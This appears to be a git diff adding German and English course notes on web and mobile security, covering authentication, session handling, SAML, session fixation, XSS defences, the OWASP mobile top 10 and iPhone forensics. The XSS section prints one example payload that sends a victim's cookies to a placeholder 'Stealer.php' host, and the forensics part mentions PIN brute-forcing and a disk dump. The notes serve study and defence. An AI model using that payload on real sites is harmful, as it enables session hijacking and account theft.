@@ -884,11 +884,510 @@ Kommt innerhalb eines Prepared Statement ein dynamischer Parameter vor, so ist d
 
 **6.2.1. Begriffe**
 
+Identication
+	Sich ausweisen (wer man ist)
 Authentication
-	Wer Zugriff haben darf auf App
+	Identität nachweisen
 Authorization
 	Welche Operationen ein User mit der App machen darf
 Identification
 	Verifizieren der Identität
 	
 	
+No Authentication without Identification, may be provided at same time though! (Login)
+Authorization is ascertained after authentication.
+
+
+**6.2.2. Anforderungen stellen Authentication & Session**
+
+Authentication
+	* Allg
+		* Keep design simple
+		* Never invent own cryptography
+	* Password rules
+		* Password Strength Controls
+		* Only store passwords in HASHED form, with Salt for every user
+		* Hash ASAP, never compare plain-text
+		* Secure Password Recovery Mechanisum (Security Patterns!)
+	* HTTPS
+		* Don't submit password over plain-HTTP!
+
+Session
+	* Uniqueness
+		* Each session must have a unique identifier
+	* Unpredictable
+		* It shall not be possible to predict an identifier
+	* Consistency and Logging
+		* A session must be identifiable at all tiers (mapping from 
+		* external to internal session ID
+		* It should be possible to log session information at all tiers
+
+		
+**6.2.3. drei Faktoren der Authentication**
+ 
+* Something you know - Passwort
+* Something you have - Token Generator / Smart-Card
+* Something you are - Bio (Iris, Finger, etc)
+
+Strong authentication - 2 or more Auth. (multifactor login)
+
+
+European Commission definition of strong authentication:
+a procedure based on the use of two or more of the following elements– categorised as knowledge, ownership and inherence:
+
+i) something only the user knows, e.g. static password, code, personalidentification number;
+ii) something only the user possesses,e.g.token, smart card, mobile phone;
+iii) something the user is, e.g. biometric characteristic, such as a fingerprint.
+ 
+In addition, the elements selected must be mutually independent, i.e. the breach of one does not compromise the other(s). At least one of the elements should be non-reusable and non-replicable (except for inherence), and not capable of being surreptitiously stolen via the Internet. The strong authentication procedure should be designed in such a way as to protect the confidentiality of the authentication data.
+
+
+**6.2.4. "HTTP Protocol based Authentication", "Application Login" und "HTTPS Protocol based Authentication"**
+ 
+HTTP Protocol based Authentication
+	* "Authorization" HTTP Header. Böööse (Wrap in HTTPS!)
+	* Authorization: Basic base64(user + ":" + password)
+Application Login
+	* Authentication basierend auf Login-Credentials (meist Username, Passwort) und verglichen in Applikation (statisch, DB, PW-File)
+HTTPS Protocol based Authentication
+	* HTTPS erstellt Verbindung mit Server, erhält SSL Session ID. (Auth durch BASIC Auth???)
+
+
+**6.2.5.  Form autocompletion**
+
+* Autocompletion hinterlässt z.B. E-Mail/Username (Identification). HTML-Attribute autocomplete="off" ist aber non-standard. Username-Field mit random-Wert ergänzen.
+
+
+**6.2.6. Back Button Relogin Vulnerability**
+
+* Mit dem Back-Button wird der alte HTTP-Kontext (inkl Cookies) mitgeschickt. Wird ein Session nach dem Logout nicht zerstört ist der User wieder eingeloggt. (Public Computer Back-Attack)
+* Logout --> invalidate Session on Server, Return new Session, Redirect to different Page
+
+
+**6.2.7. User Enumeration**
+
+* Kann ein Angreifer dank einer Fehlermeldung die Existenz eines Benutzers bestätigen (Username does not exist => Password is wrong), macht es ihn seine Aufgabe wesentlich einfacher. Usernames: admin, guest, superadmin, sa, etc.
+* (Fehler)Meldung bei Login muss zwingend generisch gestaltet werden (Bunutzername oder Passwort falsch.)
+
+
+**6.2.8. SAML**
+
+* Die Security Assertion Markup Language (kurz SAML) ist ein XML-Framework zum Austausch von Authentifizierungs- und Autorisierungsinformationen. SAML sollte vor allem für Webservices angeboten werden.
+* SAML assertions werden vom Identity Provider zum Service Provider übertragen. Assertions sind Aussagen statements, die ein Service Provider nutzt, um über das Zulassen eines Zugriffs zu entscheiden. Drei Typen von statements werden von SAML genutzt:
+
+Authentication statements: 
+	Zusicherung einer Authentifizierung für Subjekt S zur Zeit T mittels M. (für Single Sign-On)
+Attribute statements: 
+	Zusicherung, dass ein Subjekt S über Attribut A verfügt mit dem Wert a. (für verteilte Transaktion/Autorisierung)
+Authorization decision statements: 
+	Autorisierung bestimmter Ressourcen.
+
+	
+* Sehr komplex, hat sich nicht bewährt.
+
+
+**6.2.9. SAML Begriffe IdP und SP**
+ 
+IdP
+	Identity Provider. z.B. Login to Website via FB, FB ist dann Identity Provider vom User.
+SP
+	Service Provider. Provides Webservices. Relies on IdP for Authentication
+IdP-Initiated
+	In IDP Init SSO the Federation process is initiated by the IDP sending an unsolicited SAML Response to the SP.
+SP-Initiated
+	In SP-Init, the SP generates an AuthnRequest that is sent to the IDP as the first step in the Federation process and the IDP then responds with a SAML Response.
+
+.. figure:: img/rq-6.2.9.1.jpg
+
+   IdP-Initiated
+
+
+.. figure:: img/rq-6.2.9.2.jpg
+
+   SP-Initiated
+
+
+**6.2.10. SAML based SSO**
+
+.. figure:: img/rq-6.2.10.1.jpg
+
+   Post Bindings
+
+
+.. figure:: img/rq-6.2.10.2.jpg
+
+   Artefakten
+
+
+**6.2.11. Attacken für SAML & Gegenmassnahmen**
+
+* Replay - Attack
+	* Use SSL
+	* Opportunistic programming (just use what you need)
+	* Use Library with full SAML support
+* DoS
+	* DoS Protection / Mitigation
+
+
+**6.2.12. Attacken gibt es, um Browser Sessions zu klauen**
+
+Session-Sniffing: 
+	Capture Session (also Cookie Data) on the wire. Mit HTTPS etwas schwieriger
+XSS: 
+	Cross-Site-Scripting
+
+
+**6.2.13. Warum keine URL-based Sessions**
+
+* Wird ein Image von einem Host geladen wird immer ein Refer übermittelt. Ist der Session-ID im URL drin, gelingt es dem Angreifer sehr einfach an die Session-ID's zu kommen.
+* Bei sehr schlechter Implementierung: User kommt via Goolge-Session auf Webseite, User loggt sich ein, Tada alle weitere Benutzer, die via Google kommen sind eingeloggt.
+
+
+**6.2.14. Session Fixation / Massnahmen**
+
+Session fixation attacks attempt to exploit the vulnerability of a system which allows one person to fixate (set) another person's session identifier (SID).
+
+* Attack via accept any SID (Eve zwingt Adam dazu Link mit von Eve erzeugten SID zu öffnen, Server akzeptiert SID)
+* Attack via server generated SID (Eve speichert ihre Session-ID - erhalten vom Server, zwingt Adam dies zu verwenden aka. Link, etc)
+* Attacks using cross-site cooking (does not work with modern browsers) - Set Session-ID of another Domain
+* Attacks using cross-subdomain cooking - Set Session-ID for entire domain and not just sub-domain.
+
+Massnahmen:
+
+* Do not accept session identifiers from GET / POST variables
+* Change Session-ID after Logon
+* Store session identifiers in HTTP cookies
+* Utilize SSL / TLS Session identifier
+* Accept only server-generated SIDs
+* Time old SID's
+* Destroy session if Referrer is suspicious
+
+
+**6.2.15. restriktiven Cookie Parameter**
+
+Secure Cookies
+	only via HTTPS
+HTTP Only
+	disallow Javascript from reading cookies.
+
+
+	
+6.3 XSS
+-------
+
+**6.3.1. Same Origin Policy**
+
+Protocoll+Host+Port stimmen überein
+
+.. image:: img/rq-6.3.1.1.jpg
+
+
+**6.3.2. über eine XSS Lücke Sessions klauen**
+
+XSS Allg: Inhalt wird nicht korrekt escaped und wird in dem Browser "ausgeführt" via Javascript.
+
+Beispiel:
+
+::
+
+	hxxp://www.example.com/index.php?search=<script>location.href = 'http://www.Yoursite.com/Stealer.php?cookie='+document.cookie;</script>
+
+
+* Stealer.php macht dann selber ein redirect zum refer. Benutzer merkt fast nichts.
+* Möglich ist auch die Einbindung vom Images (1x1 transparent gif) und cookies als query anhängen. 
+
+
+**6.3.3. Arten von XSS**
+ 
+Stored
+	* Wird in Applikation (DB, etc) gespeichert und gerendert
+	* Forum, comments + messages
+	* Profile (Signatur, Username)
+	* Mail (HTML)
+Reflected
+	* Non Persistent
+	* 404 - Pages, The Page <script>…</script> does not exist
+	* Application Error Pages <script>..-</script> not valid for this field
+	* Search Pages
+DOM injections
+	* Wird Client-Seitig eingebunden durch dynamische JS anzweisung
+	* Z.B. Sprachparameter in URL, Auslesen mit JS, erstellen vom <h1> Element
+
+	
+**6.3.4. Welche Massnahmen gegen XSS**
+ 
+* #0 - Never Insert Untrusted Data Except in Allowed Locations
+* #1 - HTML Escape Before Inserting Untrusted Data into HTML Element Content
+* #2 - Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes
+* #3 - JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values
+* #4 - CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values
+* #5 - URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values
+* #6 - Sanitize HTML Markup with a Library Designed for the Job
+* Bonus #1: Use HTTPOnly cookie flag
+* Bonus #2: Implement Content Security Policy
+
+
+
+7 Mobile Security
+=================
+
+**7.0.1. "Mobile Applications Plattform"**
+
+.. image:: img/rq-7.0.1.1.jpg
+
+
+**7.0.2.  OWASP im Threat Modelling Process**
+ 
+Mobile Application Architecture 
+	This area describes how the application is designed from device specific features used by the application, wireless transmission protocols, data transmission mediums, interaction with hardware components and other applications.
+Mobile Data 
+	What data does the application store and process? What is the business purpose of this data and what are the data workflows?
+Threat Agent Identification 
+	What are the threats to the mobile application and who are the threat agents. This area also outlines the process for defining what threats apply to the mobile application.
+Methods of Attack 
+	What are the most common attacks utilized by threat agents. This area defines these attacks so that controls can be developed to mitigate attacks.
+Controls 
+	What are the controls to prevent attacks? This is the last area to be defined only after previous areas have been completed by the development team.
+
+
+**7.0.3. Beispiel Moves**
+
+* Verwendung von Location Data + Accelerometer. Stellt die tägliche Aktivität da.
+* Daten: Location (GPS, Wi-Fi), Accelerometer samples, places, Device data
+* Speichern: everywhere and anywhere. Daten werden mit Plugins geteilt…
+* Schutz?
+
+
+**7.0.4. Angriffskanäle bei Smartphones**
+
+* Social Engineering
+* Drive-by Exploitation
+* Phishing
+* Network Services (Man-In-Middle WLAN)
+* WebView
+* Market Place / direct install
+* Physical Attacks (USB Aufladeports in Hotels..)
+
+
+**7.0.5. OWASP Risiken identifizieren**
+ 
+1) Take the list of all sensitive data (or information to protect) listed in Section Mobile Data
+2) Make a list of all the ways to access this data
+3) Identify the attackers using the ways i.e. the medium to access sensitive data 
+
+
+**7.0.6. Thread Agents Kategorien**
+
+Human Interaction vs Automated Programs
+
+.. image:: img/rq-7.0.6.1.jpg
+
+
+**7.0.7. Angriffsszenarien bei einem Mobile Device**
+
+* Local Memory / Storage based methods (“Method aimed to read the local application memory”)
+* OS and application level methods
+* Endpoints based methods (Webs Servise, Malware in app store, Cloud Storage)
+* Communication Channel Based Methods (Wireless interfaces based methods)
+* Miscellaneous Methods (GPS exploit, microphone recordings)
+
+
+**7.0.8. Apps Rechte und Speicherzugriff**
+
+* Apps werden grundsätzlich im User-Mode ausgeführt. Bei Rooted/jailbraked devices kann ein App auch in kernel-mode ausgeführt werden.
+* Flash Memory, Internal Memory, SD
+
+
+**7.0.9. Malware im App Store**
+
+* Android: App wird gescannt nach bekannte Malware, User melden Probleme mit App
+* iOS: Auch gescannt, manuell überprüft. (schwieriger)
+* Angriff auf AppStore selbst
+
+.. figure:: img/rq-7.0.9.1.jpg
+
+   Lines of Defense
+
+
+**7.0.10. Angriffe Auf Kommunikationschannels**
+
+* Man in the middle (MiTM) attacks which can steal data packets including SMS or voice packets
+* Stealing data when its in-transit using wireless channel like 802.11, NFC based data exchange or Bluetooth based data exchange. Application Level Attacks
+* Targeting malicious corporate network. (e.g. VPN Keys, etc)
+
+
+**7.0.11. Flexispy und Probleme**
+
+* Flexispy captures the content of emails, texts, call log details and GPS coordinates. Flexispy also gives customers the ability to listen to live calls. Customers are alerted that the mobile device with the software installed is on an active call. 
+
+Problem
+	* Kann beliebig eingesetzt werden. Verletzung Privatsphäre.
+	* Device muss ge-Jailbreaked sein -> führt zu weitere Probleme, hebt Schutz auf.
+
+**7.0.12. Sicherheitsprobleme im Smartphone Umfeld**
+
+.. figure:: img/rq-7.0.12.1.jpg
+
+   PC-Welt
+
+
+**7.0.13. Mobile Security Top 10 Listen**
+
+ACHTUNG! Die Folien weisen eine andere Reihenfolge auf… Unten die aktuellste Reihenfolge nach Bedrohung 201X.
+
+M1 - Weak Server Side Controls
+	Alles was  nicht auf dem Phone stattfindet. z.B. SQL Injection auf Server-Side (OWASP Top 10)
+M2 - Insecure Data Storage
+	* Sensitive Data nicht verschlüsselt. OS spezifische Verschlüsselungsmöglichkeiten (Stores) nicht verwendet.
+	* World readable Configs
+M3 - Insufficient Transport Layer Protection
+	Kein SSL, SSL Warnungen ignoriert, Cert Chain nicht bestätigt, schlechte Implementierung von SSL (iOS lässt grüssen)
+M4 - Unintended Data Leakage
+	Passwort in Log ausgegeben (clap, clap). Review third party libs.
+M5 - Poor Authorization and Authentication
+	Verwendung von DeviceID oder SubscriberID as einziger Auth-Methode.
+M6 - Broken Cryptography
+	Key mit Verschlüsselte Datei abspeichern bringt nichts. OS-Features verwenden
+M7 - Client Side Injection
+	Pure web apps (XSS). Phone Reset Aufruf via tel://resetcodehere# möglich!
+M8 - Securty Decisions Via Untrusted Inputs
+	App Aufrufe via eigene Handlers (z.B. skype:23487234?call) => Anruf wird direkt betätigt. Immer User nach eine Bestätigung Fragen von externe Quellen.
+M9 - Improper Session Handling
+	* Sessions leben länger auf dem Client. Absichern, dass ein Session revoke (echo to server, reponse denied, destroy session)
+	* High entropy sources!
+M10 - Lack of Binary Protections
+	* Analysis byte-code. (API Keys, Passwörter, Sensitive Bussiness-Logik)
+	* Keine God-Mode Code!
+
+
+
+8 Smartphone Security
+=====================
+
+**8.0.1. Risiken eines kompromitierten Gerätes**
+
+Privat
+	* Konto Infos, Social Engineering
+Business
+	* Wirtschaftsspionage
+	* Zugriff auf interne Netzwerk-Firma (call-home)
+
+	
+**8.0.2. Sicherheitsmechanismen Hardware**
+
+Schlüsselspeicher (Keychain)
+	* Sichere Ablage von «sensitiven» Informationen
+	* Schutz gegen unberechtigten Zugriff auf dem Gerät, im Backup, usw.
+Geräte-PIN
+	* Schutz gegen interaktive Verwendung des Gerätes
+	* Schutz gegen Zugriff über andere Schnittstellen
+Speicherverschlüsselung
+	* Schutz gegen physischen Zugriff auf den Speicher
+	* Schutz gegen Zugriff mit modifiziertem Betriebssystem
+
+
+**8.0.3. Sicherheitsmechanismen Betriebssystem**
+
+Update-Funktionalität
+	* Schnelle Aktualisierung  von Betriebssystem und Apps
+Zugriffskontrolle auf OS-Stufe
+	* Optimale Trennung von Anwendungen auf Betriebssystem-Stufe
+	* Einsatz von Betriebssystem-Benutzern mit eingeschränkten Rechten
+Integritätskontrolle auf OS-Stufe
+	* Schutz gegen «Rooting» / «Jailbreaking»
+	* Sicherstellen, dass alle Sicherheitsmechanismen intakt sind
+
+
+**8.0.4. Sicherheitsmechanismen um Apps abzusichern**
+
+Sandbox
+	* Logische Trennung (Separierung) von Apps
+	* Zugriffe auf Betriebssystem-Funktionen und Hardware einschränken
+Integritätskontrolle Apps
+	* Inhaltliche und technische Kontrolle der Apps im Store
+	* Verwendung von digitalen Signaturen
+Rechtesteuerung
+	* Vergabe von Zusatzrechten durch Benutzer (z.B. Zugriff auf GPS, Internet)
+Backup
+	* Regelmässige Erstellung von Backups mit einfacher Restore Möglichkeit
+	* Sichere Ablage der Backup-Daten
+
+
+**8.0.5.  iOS und Android Daten Verschlüsselung**
+
+iOS
+	* Keychain in SQLitte Datenbank abgelegt. Eine Zeile pro Keychain
+	* Apps haben Zugriff nur auf ihre eigenen Einträge
+	* Apps können über Zugriffsklassen bestimmen (vor/nach PIN-Eingabe) und wo (thisDeviceOnly, Cloud!)
+	* Bad: Kopie der Keychain landet im Backup und kann entschlüsselt werden.
+	* Geräte haben Crypto-Chip und eingebrannten HUID.
+	* Jede Datei wird mit einem individuellen Schlüssel verschlüsselt
+	* Gut: Verschlüsselung ist nicht deaktivierbar
+	* Bad: Verschlüsselung ist nicht abhängig vom Geräte-PIN (kann ohne PIN vollständig aufgestartet werden)
+
+Android
+	* Speicherverschlüsselung mit dm-crypt (Linux Kernel)
+	* Möglichkeit zur Verschlüsselung der SD-Speicherkarte (Herstellerabhängig)
+	* Verschlüsselung ist abhängig von Geräte-PIN -> Kein Aufstarten ohne PIN
+	* Bad: Verschlüsselung ist nicht per Default aktiviert
+
+	
+**8.0.6. Signaturmechanismen iOS und Android**
+
+iOS
+	* Nur von Apple signiert Apps lassen sich installieren
+	* Apps sind gegen unberechtigte Modifikation vor der Installation geschützt
+
+Android
+	* Durch Entwickler signiert (keine Überprüfung Zertifikatskette)
+	* Apps aus dem App-Store sind zusätzlich Signiert durch Google
+
+	
+**8.0.7.  Funktionalität eines gestohlenen iPhones, leakbare Daten**
+ 
+Grundsätzlich
+	teurer Papiergewicht
+
+System Partition
+	Dump der Partition möglich, sobald Gerät gestartet ist. Daten können gelesen werden
+
+Data Partition
+	Dump der Partition möglich, sobald Gerät gestart ist. Inhalt der Files ist aber verschlüsselt!
+
+	
+**8.0.8. Filesystem- und Fileverschlüsselung**
+
+.. figure:: img/rq-8.0.8.1.jpg
+
+   Filesystem
+
+
+.. figure:: img/rq-8.0.8.2.jpg
+
+   File
+
+
+**8.0.9. Löschen von Files/Daten / Wiederherstellung**
+
+Löschen
+	Beim Löschen eines Files wird der Schlüssel der Datei überschrieben (Daten sind dort, aber sehen wie garbage aus)
+
+Wiederherstellung
+	* Undelete ist grundsätzlich nicht möglich
+	* Über Journal-Funktionalität möglich (ist jedoch sehr klein 8 MB).
+	* iPhone raw NAND recovery and forensics (requires jailbroken devices, direkten Zugriff auf Flash-Speicher)
+
+	
+**8.0.10. Forensic Tools**
+ 
+(Vorausgesetzt ist ein Jailbreak!)
+ 
+* Bruteforce auf die PIN
+* Dumpen von Keys
+* Physical (dd if=/dev/disk0s1s) und Logical (via FS)  Data Aquisition
+* Daten von Apps werden meistens via SQLite gespeichert und dann lediglich mit Deleted vermerkt.
+
+
+
+8.1 EJPD Architektur
+--------------------
